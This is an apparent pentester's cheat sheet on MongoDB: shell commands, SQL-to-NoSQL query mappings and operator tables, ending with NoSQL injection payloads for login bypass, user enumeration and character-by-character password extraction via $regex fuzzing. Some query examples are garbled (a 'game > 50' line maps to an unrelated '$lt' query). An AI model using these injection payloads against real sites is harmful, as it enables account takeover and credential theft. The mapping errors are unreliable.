# Notes
- Hierarchy : database > collection (table) > documents (entries)
# Command lines
Connect
`mongo 1.1.1.1:27017/db`
List databases
`show dbs`
Swith database
`use dbname`
Show collections (tables)
`show collections`
Show collection entries (select from table)
`db.collname.find()`
# NoSQL
- SELECT * FROM collection WHERE last_name = 'Sandler';
`['last_name' => 'Sandler']`

- SELECT * FROM collection WHERE last_name = 'Phillips' AND gender = 'male';
`['last_name' => 'Phillips', 'gender' = 'male']`

- SELECT * FROM collection WHERE game >  50;
`['age' => ['$lt','Sandler']]`

# Operators reference
## Comparison
| Name | Description           |
| ---- | --------------------- |
| $eq  | equal                 |
| $gt  | greater than          |
| $gte | greater of equal than |
| $in  | contains              |
| $lt  | less than             |
| $lte | less or equal than    |
| $ne  | not equal             |
| $nin | not contains          |

## Logical
| Name | Description     |
| ---- | --------------- |
| $and | AND             |
| $not | NOT             |
| $nor | Combined negate |
| $or  | OR              |

# NoSQL Injections
## Login bypass
- Random user
Remplacer ?user=username&password=password par :
`user[$ne]=username&password[$ne]=password`

- Enumerate users
`user[$nin][]=admin&user[$nin][]=username1&user[$nin][]=username2&password[$ne]=password`

- Guess password length
`user[$nin][]=admin&pass[$regex]=^.{8}$&remember=on`

- Extract password
```
# Fuzz each character with burp
user=admin&pass[$regex]=A.......&remember=on
user=admin&pass[$regex]=AA......&remember=on
```